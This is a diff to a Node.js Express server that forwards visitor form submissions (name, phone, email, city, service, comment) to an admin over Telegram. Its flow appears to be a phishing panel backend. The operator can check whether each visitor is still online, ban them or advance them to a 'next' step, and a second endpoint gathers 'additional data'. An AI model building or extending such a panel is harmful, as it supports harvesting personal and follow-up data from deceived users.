@@ -3,10 +3,11 @@ const TelegramBot = require("node-telegram-bot-api");
 
 const app = express();
 
-app.use(express.json());
+app.use(express.json({ limit: "1mb" }));
+
 app.use((req, res, next) => {
-  res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Headers", "*");
+  res.header("Access-Control-Allow-Origin", "*");
+  res.header("Access-Control-Allow-Headers", "Content-Type");
   next();
 });
 
@@ -21,35 +22,38 @@ let userStatus = {};
 let seenUsers = {};
 let onlineUsers = {};
 let requestTexts = {};
+let fullRequests = {}; // 🔥 храним ВСЕ данные
 
 // ===== ONLINE =====
 function isOnline(id) {
   if (!onlineUsers[id]) return false;
-  return (Date.now() - onlineUsers[id]) < 15000;
+  return Date.now() - onlineUsers[id] < 20000;
 }
 
 // ===== ВХОД =====
 app.post("/enter", (req, res) => {
   const id = req.body.clientId;
+  if (!id) return res.json({ ok: false });
 
   onlineUsers[id] = Date.now();
 
-  enterBot.sendMessage(adminId, `👀 Вход\n🆔 ${id}`);
+  enterBot.sendMessage(adminId, `👀 Вход\n🆔 ${id}`).catch(()=>{});
   res.json({ ok: true });
 });
 
 // ===== ПИНГ =====
 app.post("/ping", (req, res) => {
   const id = req.body.clientId;
-  onlineUsers[id] = Date.now();
+  if (id) onlineUsers[id] = Date.now();
   res.json({ ok: true });
 });
 
-// ===== ОТПРАВКА =====
+// ===== ОТПРАВКА ОСНОВНОЙ ФОРМЫ =====
 app.post("/send", (req, res) => {
-  const data = req.body;
-  const id = data.clientId;
+  const d = req.body;
+  const id = d.clientId;
 
+  if (!id) return res.json({ ok: false });
   if (bannedUsers[id]) return res.json({ ok: false });
 
   userStatus[id] = "wait";
@@ -59,32 +63,41 @@ app.post("/send", (req, res) => {
 
   const statusText = isRepeat ? "🔁 ПОВТОРНАЯ ЗАЯВКА" : "🆕 НОВАЯ ЗАЯВКА";
 
-  const baseText = `${statusText}
+  // 🔥 СОХРАНЯЕМ ВСЕ 5 ПОЛЕЙ
+  fullRequests[id] = {
+    service: d.service,
+    name: d.name,
+    phone: d.phone,
+    email: d.email,
+    city: d.city,
+    comment: d.comment
+  };
+
+  const text = `${statusText}
 
 🆔 ID: ${id}
 
-📦 ${data.service}
-👤 ${data.name}
-📞 ${data.phone}`;
+📦 Услуга: ${d.service}
+👤 Имя: ${d.name}
+📞 Телефон: ${d.phone}
+📧 Email: ${d.email}
+🏙 Город: ${d.city}
+💬 Комментарий: ${d.comment}`;
 
-  requestTexts[id] = baseText;
+  requestTexts[id] = text;
 
-  mainBot.sendMessage(adminId, baseText, {
+  mainBot.sendMessage(adminId, text, {
     reply_markup: {
       inline_keyboard: [
-        [
-          { text: "🟢 Онлайн?", callback_data: "check_" + id }
-        ],
+        [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
         [
           { text: "🚫 Бан", callback_data: "ban_" + id },
           { text: "✅ Разбан", callback_data: "unban_" + id }
         ],
-        [
-          { text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }
-        ]
+        [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
       ]
     }
-  });
+  }).catch(err => console.log(err.message));
 
   res.json({ ok: true, id });
 });
@@ -94,12 +107,30 @@ app.get("/status/:id", (req, res) => {
   res.json({ status: userStatus[req.params.id] || "wait" });
 });
 
+// ===== ДОП ДАННЫЕ (5 СТРОК) =====
+app.post("/send2", (req, res) => {
+  const data = req.body;
+  const id = data.id;
+
+  if (!id) return res.json({ ok: false });
+
+  const msg = `📩 ДОП ДАННЫЕ
+
+🆔 ID: ${id}
+
+${data.value}`;
+
+  mainBot.sendMessage(adminId, msg).catch(err => console.log(err.message));
+
+  res.json({ ok: true });
+});
+
 // ===== КНОПКИ =====
 mainBot.on("callback_query", async (q) => {
   const data = q.data;
   const id = data.split("_")[1];
 
-  // 🔥 ПРОВЕРКА ОНЛАЙН (обновляет сообщение)
+  // онлайн
   if (data.startsWith("check")) {
     const online = isOnline(id);
 
@@ -118,23 +149,25 @@ mainBot.on("callback_query", async (q) => {
     mainBot.answerCallbackQuery(q.id);
   }
 
-  // 🔥 БАН
+  // бан
   if (data.startsWith("ban")) {
     bannedUsers[id] = true;
-    mainBot.answerCallbackQuery(q.id, { text: "🚫 Забанен" });
+    mainBot.answerCallbackQuery(q.id, { text: "🚫 Бан" });
   }
 
-  // 🔥 РАЗБАН
+  // разбан
   if (data.startsWith("unban")) {
     delete bannedUsers[id];
-    mainBot.answerCallbackQuery(q.id, { text: "✅ Разбанен" });
+    mainBot.answerCallbackQuery(q.id, { text: "✅ Разбан" });
   }
 
-  // 🔥 ДАЛЬШЕ
+  // дальше
   if (data.startsWith("allow")) {
     userStatus[id] = "next";
     mainBot.answerCallbackQuery(q.id, { text: "➡️ Дальше" });
   }
 });
 
-app.listen(process.env.PORT || 3000);
+app.listen(process.env.PORT || 3000, () => {
+  console.log("SERVER OK");
+});
